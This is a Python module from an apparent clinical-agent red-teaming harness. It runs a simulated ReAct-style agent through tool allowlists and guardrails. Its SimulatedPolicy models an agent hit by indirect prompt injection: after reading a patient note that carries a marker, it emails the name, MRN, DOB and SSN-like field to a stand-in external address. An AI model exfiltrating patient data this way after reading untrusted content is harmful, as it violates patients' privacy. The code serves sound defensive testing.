"""A simple ReAct-like agent loop with allowlisted tools.

The "model" is a deterministic ``SimulatedPolicy``. It is NOT an LLM. It
optionally models a *susceptible* agent: after reading an untrusted note that
contains the benign marker, it deviates with probability ``susceptibility``
and attempts an external email (to a reserved ``.example`` domain, written only
to a local file). The note itself never asks for this; the deviation comes
from the simulated policy, which stands in for a hypothetical compromised model.
"""

from __future__ import annotations

import json
import random
import re
from collections.abc import Sequence
from dataclasses import dataclass, field
from typing import Protocol

from clinical_redline.guardrails import Guardrails
from clinical_redline.models import (
    IPI_MARKER,
    AgentAction,
    AgentResult,
    AgentStep,
    GuardrailDecision,
    PatientRecord,
    RAGDocument,
)
from clinical_redline.tools import ToolError, Toolbox

SIMULATED_EXTERNAL_SINK = "sink@external.example"
_PATIENT_RE = re.compile(r"\bP\d{3}\b")
_EMAIL_RE = re.compile(r"[\w.+-]+@[\w-]+(?:\.[\w-]+)+")
_GUIDANCE_WORDS = ("guideline", "recommend", "dosing", "dose")


class Policy(Protocol):
    """Interface for anything that chooses the next agent action."""

    def next_action(self, task: str, history: Sequence[AgentStep]) -> AgentAction:
        """Choose the next action.

        Args:
            task: The user task.
            history: Steps executed so far.

        Returns:
            The next action; ``tool="finish"`` ends the run.
        """
        ...


def _latest_record(history: Sequence[AgentStep]) -> PatientRecord | None:
    """Return the most recent successfully read patient record, if any."""
    for step in reversed(history):
        if step.action.tool == "ehr_read" and not step.blocked and not step.error:
            return PatientRecord.model_validate_json(step.observation)
    return None


def _latest_docs(history: Sequence[AgentStep]) -> list[RAGDocument]:
    """Return documents from the most recent successful rag_search, if any."""
    for step in reversed(history):
        if step.action.tool == "rag_search" and not step.blocked and not step.error:
            return [RAGDocument.model_validate(d) for d in json.loads(step.observation)]
    return []


@dataclass
class SimulatedPolicy:
    """Deterministic, stateful stand-in for an LLM. Create one per run.

    Attributes:
        susceptibility: Probability in [0, 1] of "following" the marker.
        seed: Seed for the policy's private RNG.
    """

    susceptibility: float = 0.0
    seed: int = 0
    _rng: random.Random = field(init=False, repr=False)
    _decided: bool = field(default=False, init=False, repr=False)
    _followed: bool = field(default=False, init=False, repr=False)
    _exfil_sent: bool = field(default=False, init=False, repr=False)
    _summary_sent: bool = field(default=False, init=False, repr=False)

    def __post_init__(self) -> None:
        """Validate configuration and seed the RNG.

        Raises:
            ValueError: If ``susceptibility`` is outside [0, 1].
        """
        if not 0.0 <= self.susceptibility <= 1.0:
            raise ValueError("susceptibility must be within [0, 1]")
        self._rng = random.Random(self.seed)

    def next_action(self, task: str, history: Sequence[AgentStep]) -> AgentAction:
        """Choose the next action (see ``Policy.next_action``).

        Args:
            task: The user task.
            history: Steps executed so far.

        Returns:
            The next action.
        """
        used = {s.action.tool for s in history}
        pid = _PATIENT_RE.search(task)
        recipient = _EMAIL_RE.search(task)
        record = _latest_record(history)

        if pid and "ehr_read" not in used:
            return AgentAction(
                tool="ehr_read",
                args={"patient_id": pid.group(0)},
                rationale="Load the chart before summarizing.",
            )

        if record is not None and not self._decided:
            self._decided = True
            self._followed = (
                IPI_MARKER in record.notes and self._rng.random() < self.susceptibility
            )

        if self._followed and not self._exfil_sent and record is not None:
            self._exfil_sent = True
            body = (
                f"Name: {record.name}; MRN: {record.mrn}; "
                f"DOB: {record.dob}; SSN: {record.ssn_like}"
            )
            return AgentAction(
                tool="email_send",
                args={"to": SIMULATED_EXTERNAL_SINK, "body": body},
                rationale="SIMULATED deviation after reading an untrusted note.",
            )

        if any(w in task.lower() for w in _GUIDANCE_WORDS) and "rag_search" not in used:
            return AgentAction(
                tool="rag_search",
                args={"query": task, "k": 3},
                rationale="Look up guidance in the knowledge base.",
            )

        summary = self._summary(record, pid.group(0) if pid else None)
        if recipient and not self._summary_sent:
            self._summary_sent = True
            return AgentAction(
                tool="email_send",
                args={"to": recipient.group(0), "body": summary},
                rationale="Send the requested summary.",
            )

        answer = summary
        docs = _latest_docs(history)
        if docs:
            answer += f" Guidance: {docs[0].text}"
        if self._followed:
            answer += f" [{IPI_MARKER}]"
        return AgentAction(tool="finish", args={"answer": answer}, rationale="Done.")

    @staticmethod
    def _summary(record: PatientRecord | None, pid: str | None) -> str:
        """Build a PHI-free chart summary."""
        if record is None:
            return f"No chart available for {pid or 'unknown patient'}."
        return (
            f"Chart summary for {record.patient_id}: {len(record.medications)} "
            f"medication(s) and {len(record.allergies)} allergy entries on file; "
            f"condition: {record.diagnosis}."
        )


def _blocked(action: AgentAction, decision: GuardrailDecision) -> AgentStep:
    """Build a blocked step from a decision."""
    return AgentStep(
        action=action,
        observation="BLOCKED: " + "; ".join(decision.reasons),
        blocked=True,
        decision=decision,
    )


def _execute(
    action: AgentAction, tools: Toolbox, guardrails: Guardrails | None
) -> AgentStep:
    """Run one action through the allowlist, guardrails, and the toolbox."""
    if action.tool not in tools.allowed_tools:
        return _blocked(
            action,
            GuardrailDecision(
                allowed=False,
                rule_ids=["tool_not_allowlisted"],
                reasons=[f"tool {action.tool!r} is not allowlisted"],
            ),
        )
    decision: GuardrailDecision | None = None
    if guardrails is not None:
        decision = guardrails.check_action(action)
        if not decision.allowed:
            return _blocked(action, decision)
    try:
        observation = tools.call(action.tool, action.args)
    except (ToolError, ValueError, KeyError) as exc:
        return AgentStep(
            action=action, observation=f"ERROR: {exc}", error=True, decision=decision
        )
    return AgentStep(action=action, observation=observation, decision=decision)


def run_agent(
    task: str,
    tools: Toolbox,
    guardrails: Guardrails | None = None,
    policy: Policy | None = None,
    max_steps: int = 8,
) -> AgentResult:
    """Run the ReAct-like loop: choose action, check, execute, observe.

    Args:
        task: Natural-language task.
        tools: Allowlisted toolbox.
        guardrails: Guardrails applied before each tool call; None disables
            them (the tool allowlist still applies).
        policy: Action chooser; defaults to a non-susceptible
            ``SimulatedPolicy``. TODO: plug in a real LLM policy for
            authorized testing.
        max_steps: Maximum tool steps before giving up.

    Returns:
        The run result, including blocked steps.

    Raises:
        ValueError: If ``max_steps`` is not positive.
    """
    if max_steps <= 0:
        raise ValueError("max_steps must be positive")
    active = policy if policy is not None else SimulatedPolicy()
    steps: list[AgentStep] = []
    for _ in range(max_steps):
        action = active.next_action(task, steps)
        if action.tool == "finish":
            return AgentResult(
                task=task,
                steps=steps,
                final_answer=str(action.args.get("answer", "")),
                terminated="finished",
            )
        steps.append(_execute(action, tools, guardrails))
    return AgentResult(task=task, steps=steps, final_answer="", terminated="max_steps")
